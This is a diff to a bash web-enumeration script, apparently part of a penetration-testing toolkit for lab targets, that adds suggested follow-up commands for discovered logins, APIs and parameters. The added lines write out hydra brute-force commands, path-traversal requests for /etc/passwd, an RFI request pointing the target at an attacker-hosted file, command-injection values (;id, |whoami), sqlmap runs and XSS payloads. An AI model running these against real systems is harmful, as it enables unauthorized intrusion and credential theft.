@@ -48,7 +48,15 @@ set -o pipefail
 #==============================================================================
 # CONFIGURATION
 #==============================================================================
-TOOLKIT_ROOT="${TOOLKIT_ROOT:-${HOME}/offsec}"
+if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
+    if [[ -n "${SUDO_USER:-}" ]]; then
+        _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
+        TOOLKIT_ROOT="${_inv_home:-$HOME}/offsec"
+        unset _inv_home
+    else
+        TOOLKIT_ROOT="${HOME}/offsec"
+    fi
+fi
 OUTPUT_ROOT="${TOOLKIT_ROOT}/web"
 THREADS=40
 FFUF_TIMEOUT=30                      # per-request timeout (seconds)
@@ -977,7 +985,7 @@ generate_next_steps() {
         while IFS= read -r auth_line; do
             local auth_url auth_path
             auth_url=$(echo "$auth_line" | awk '{print $1}')
-            auth_path="${auth_url#${url%/}}"
+            auth_path="${auth_url#"${url%/}"}"
             [[ "$auth_path" == "$auth_url" || -z "$auth_path" ]] && auth_path="/"
             auth_cmds+=("hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} http-get ${auth_path}")
         done <<< "$auth_hits"
@@ -996,6 +1004,16 @@ generate_next_steps() {
             "curl -sk ${url%/}/login | sed -n '1,80p'" \
             "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'" \
             "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u '${url%/}/login?FUZZ=test' -mc all -fs 0"
+    fi
+
+    if grep -qiE '<form[^>]+method=["'\'']?post|type=["'\'']?password|name=["'\'']?(user(name)?|login|email|pass(word)?)' \
+       "$work_dir/fingerprint/homepage_source.html" "$work_dir/content/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "HTTP POST login form evidence found" \
+            "source/content output contains POST form, password field, or auth-style input names" \
+            "curl -sk ${url%/}/login -o /tmp/${HOST_SAFE:-web}_login.html" \
+            "grep -oiE '<form[^>]+|name=[\"'\"'\"'][^\"'\"'\"']+|type=[\"'\"'\"'][^\"'\"'\"']+' /tmp/${HOST_SAFE:-web}_login.html | head -40" \
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'"
     fi
 
     local sensitive_hits
@@ -1117,6 +1135,22 @@ generate_next_steps() {
             "curl -sk ${url%/}/swagger.json | jq .info,.paths 2>/dev/null" \
             "curl -sk ${url%/}/openapi.json | jq .info,.paths 2>/dev/null" \
             "ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u '${url%/}/api/FUZZ' -mc 200,201,204,301,302,401,403"
+    fi
+
+    local api_hits
+    api_hits=$(grep -hiE '/api(/|[? ]).*\| (200|201|204|301|302|401|403) \|' "$work_dir/content/"*.txt "$work_dir/content/recursive/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null | awk '{print $1}' | head -4)
+    if [[ -n "$api_hits" ]]; then
+        local api_cmds=()
+        while IFS= read -r api_url; do
+            [[ -z "$api_url" ]] && continue
+            api_cmds+=("curl -skI '${api_url}'")
+            api_cmds+=("curl -sk '${api_url}' | jq . 2>/dev/null || curl -sk '${api_url}' | head -40")
+        done <<< "$api_hits"
+        api_cmds+=("ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u '${url%/}/api/FUZZ' -mc 200,201,204,301,302,401,403")
+        append_next_finding "$next_file" \
+            "API endpoint discovered" \
+            "content output contains /api path with actionable HTTP response" \
+            "${api_cmds[@]:0:8}"
     fi
 
     if grep -qiE '/actuator|spring|whitelabel error page' "$work_dir/fingerprint/whatweb.txt" "$work_dir/fingerprint/headers.txt" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
@@ -1264,6 +1298,11 @@ generate_next_steps() {
     param_lines=$(find "$work_dir/params" -name "*.txt" -exec grep -h '.' {} \; 2>/dev/null | grep -v '^No\|^-\|^URL' | head -3)
     if [[ -n "$param_lines" ]]; then
         local param_cmds=()
+        local lfi_cmds=()
+        local rfi_cmds=()
+        local cmdi_cmds=()
+        local sqli_cmds=()
+        local xss_cmds=()
         while IFS= read -r param_line; do
             local param_url
             param_url=$(echo "$param_line" | awk '{print $1}')
@@ -1274,11 +1313,62 @@ generate_next_steps() {
             param_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u '${param_url/testvalue/FUZZ}' -mr 'root:' -mc all")
             param_cmds+=("# XSS test:")
             param_cmds+=("curl -sk '${param_url/testvalue/%3Cscript%3Ealert(1)%3C%2Fscript%3E}'")
+            if echo "$param_url" | grep -qiE '[?&](file|path|page|include|template|view|doc|download|redirect|url)='; then
+                lfi_cmds+=("curl -sk '${param_url/testvalue/..%2F..%2F..%2F..%2Fetc%2Fpasswd}'")
+                lfi_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u '${param_url/testvalue/FUZZ}' -mr 'root:' -mc all")
+            fi
+            if echo "$param_url" | grep -qiE '[?&](url|uri|path|page|file|load|redirect|callback)='; then
+                rfi_cmds+=("python3 -m http.server 8000 --directory /tmp")
+                rfi_cmds+=("curl -sk '${param_url/testvalue/http:%2F%2F${KALI_IP}:8000%2Frfi.txt}'")
+            fi
+            if echo "$param_url" | grep -qiE '[?&](cmd|exec|command|ping|host|ip|lookup|query|search)='; then
+                cmdi_cmds+=("curl -sk '${param_url/testvalue/%3Bid}'")
+                cmdi_cmds+=("curl -sk '${param_url/testvalue/%7Cwhoami}'")
+                cmdi_cmds+=("ffuf -w /usr/share/seclists/Fuzzing/command-injection-commix.txt -u '${param_url/testvalue/FUZZ}' -mc all -fs 0")
+            fi
+            if echo "$param_url" | grep -qiE '[?&](id|item|product|cat|category|user|uid|pid|page_id|article)='; then
+                sqli_cmds+=("sqlmap -u '${param_url}' --batch --level 3 --risk 2 --current-user --current-db")
+                sqli_cmds+=("curl -sk '${param_url/testvalue/1%27}' | head -60")
+            fi
+            if echo "$param_url" | grep -qiE '[?&](q|query|search|s|name|msg|message|comment|return|next|redirect|url)='; then
+                xss_cmds+=("curl -sk '${param_url/testvalue/%3Cscript%3Ealert(1)%3C%2Fscript%3E}'")
+                xss_cmds+=("curl -sk '${param_url/testvalue/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E}'")
+            fi
         done <<< "$param_lines"
         append_next_finding "$next_file" \
             "Parameter discovered" \
             "params output contains generated URL with parameter" \
             "${param_cmds[@]}"
+        if (( ${#lfi_cmds[@]} > 0 )); then
+            append_next_finding "$next_file" \
+                "Traversal/LFI-style parameter found" \
+                "parameter name suggests file/path/page/include/download handling" \
+                "${lfi_cmds[@]:0:6}"
+        fi
+        if (( ${#rfi_cmds[@]} > 0 )); then
+            append_next_finding "$next_file" \
+                "RFI-capable parameter name found" \
+                "parameter name suggests URL/path loading behavior" \
+                "${rfi_cmds[@]:0:6}"
+        fi
+        if (( ${#cmdi_cmds[@]} > 0 )); then
+            append_next_finding "$next_file" \
+                "Command-injection-style parameter found" \
+                "parameter name suggests command, ping, host, lookup, query, or search behavior" \
+                "${cmdi_cmds[@]:0:6}"
+        fi
+        if (( ${#sqli_cmds[@]} > 0 )); then
+            append_next_finding "$next_file" \
+                "SQLi-style parameter found" \
+                "parameter name suggests id/item/product/user/category lookup behavior" \
+                "${sqli_cmds[@]:0:6}"
+        fi
+        if (( ${#xss_cmds[@]} > 0 )); then
+            append_next_finding "$next_file" \
+                "XSS-reflection-style parameter found" \
+                "parameter name suggests search/message/comment/redirect reflection behavior" \
+                "${xss_cmds[@]:0:6}"
+        fi
     fi
 
     if ! grep -q '^## ' "$next_file" 2>/dev/null; then
@@ -1488,7 +1578,7 @@ generate_summary() {
             echo ""
             echo "  NEXT: probe robots.txt disallowed paths:"
             while IFS= read -r rpath; do
-                echo "  curl -sk -o /dev/null -w '%{http_code} ${url%/}${rpath}\n' '${url%/}${rpath}'"
+                printf "  curl -sk -o /dev/null -w '%%{http_code} %s\\n' '%s'\n" "${url%/}${rpath}" "${url%/}${rpath}"
             done <<< "$disallow_paths"
         fi
 
@@ -1528,7 +1618,9 @@ generate_summary() {
             sens_hits=$(grep -iE '\.(bak|sql|env|config|conf|xml|json|zip|tar|gz|old|backup|log).*\| 200 \|' "$f" 2>/dev/null | head -5)
             if [[ -n "${sens_hits}" ]]; then
                 sens_found=true
-                echo "${sens_hits}" | sed 's/^/  SENS: /'
+                while IFS= read -r sens_line; do
+                    printf '  SENS: %s\n' "$sens_line"
+                done <<< "${sens_hits}"
             fi
         done
         if [[ "${sens_found}" == "true" ]]; then
@@ -1556,7 +1648,9 @@ generate_summary() {
             login_hits=$(grep -iE '/(login|signin|auth|wp-login|admin).*\| 200 \|' "$f" 2>/dev/null | head -3)
             if [[ -n "${login_hits}" ]]; then
                 login_found=true
-                echo "${login_hits}" | sed 's/^/  LOGIN: /'
+                while IFS= read -r login_line; do
+                    printf '  LOGIN: %s\n' "$login_line"
+                done <<< "${login_hits}"
             fi
         done
         if [[ "${login_found}" == "true" ]]; then
@@ -1672,7 +1766,9 @@ generate_summary() {
             local param_lines
             param_lines=$(find "$work_dir/params" -name "*.txt" -exec grep -h '.' {} \; 2>/dev/null | grep -v '^No\|^-\|^URL' | head -10)
             if [[ -n "${param_lines}" ]]; then
-                echo "${param_lines}" | sed 's/^/  PARAM: /'
+                while IFS= read -r param_found_line; do
+                    printf '  PARAM: %s\n' "$param_found_line"
+                done <<< "${param_lines}"
                 echo ""
                 echo "  NEXT (test parameters for injection):"
                 while IFS= read -r param_line; do
@@ -1717,7 +1813,7 @@ OPTIONS:
   --deep             Enable deep mode: recursive fuzzing + parameter discovery
   --vhost DOMAIN     Enable vhost fuzzing against this base domain
                        e.g. --vhost target.htb
-  --root DIR         Output root directory (default: ./webenum)
+  --root DIR         Output root directory (default: $TOOLKIT_ROOT/web)
   --threads N        ffuf thread count (default: 40)
   --rate N           ffuf max requests/sec, 0=unlimited (default: 0)
   -h, --help         Show this help
@@ -1781,6 +1877,7 @@ EOF
 # ARGUMENT PARSING
 #==============================================================================
 if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
+    # shellcheck disable=SC2317
     return 0 2>/dev/null || exit 0
 fi
 
@@ -1922,7 +2019,10 @@ if [[ -z "$PROTO" || -z "$HOST" || ! "$PORT" =~ ^[0-9]+$ ]]; then
 fi
 TARGET_TAG="${HOST}_${PORT}_${PROTO}"
 OUTPUT_DIR="${OUTPUT_ROOT}/${TARGET_TAG}/artifacts/web"
-mkdir -p "${OUTPUT_DIR}"
+if ! mkdir -p "${OUTPUT_DIR}"; then
+    error "Failed to create output directory: ${OUTPUT_DIR}"
+    exit 1
+fi
 
 # Reachability precheck — fail fast instead of wasting engagement time on a dead host
 if ! curl -sS -o /dev/null --max-time 5 -k "$TARGET_URL" 2>/dev/null; then
